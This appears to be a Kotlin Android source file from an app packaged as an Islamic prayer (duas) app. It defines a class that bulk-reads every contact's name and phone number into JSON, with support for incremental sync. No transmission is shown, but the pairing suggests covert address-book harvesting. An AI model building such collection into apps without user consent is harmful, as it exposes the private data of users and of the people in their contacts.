package islamic.duas.contacts

import android.content.Context
import android.os.Build
import android.provider.ContactsContract
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject

class ContactsCollector(private val context: Context) {

    companion object {
        private const val TAG = "ContactsCollector"
    }

    fun collectAll(lastSyncMs: Long = 0L): JSONArray {
        val contacts = JSONArray()
        try {
            val uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI
            val projection = arrayOf(
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER,
                ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
                ContactsContract.Contacts.CONTACT_LAST_UPDATED_TIMESTAMP
            )

            val selection: String?
            val selectionArgs: Array<String>?
            if (lastSyncMs > 0L && Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                selection = "${ContactsContract.Contacts.CONTACT_LAST_UPDATED_TIMESTAMP} > ?"
                selectionArgs = arrayOf(lastSyncMs.toString())
            } else {
                selection = null
                selectionArgs = null
            }

            context.contentResolver.query(uri, projection, selection, selectionArgs, null)?.use { cursor ->
                val nameIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val numIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                val idIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID)

                val seen = mutableSetOf<Long>()
                while (cursor.moveToNext()) {
                    val contactId = if (idIdx >= 0) cursor.getLong(idIdx) else 0L
                    if (contactId in seen || contactId == 0L) continue
                    seen.add(contactId)

                    val name = if (nameIdx >= 0) cursor.getString(nameIdx) ?: "" else ""
                    val number = if (numIdx >= 0) cursor.getString(numIdx) ?: "" else ""

                    contacts.put(JSONObject().apply {
                        put("id", contactId)
                        put("name", name)
                        put("number", number)
                        put("ts_ms", System.currentTimeMillis())
                    })
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "collectAll error: ${e.message}", e)
        }
        return contacts
    }
}
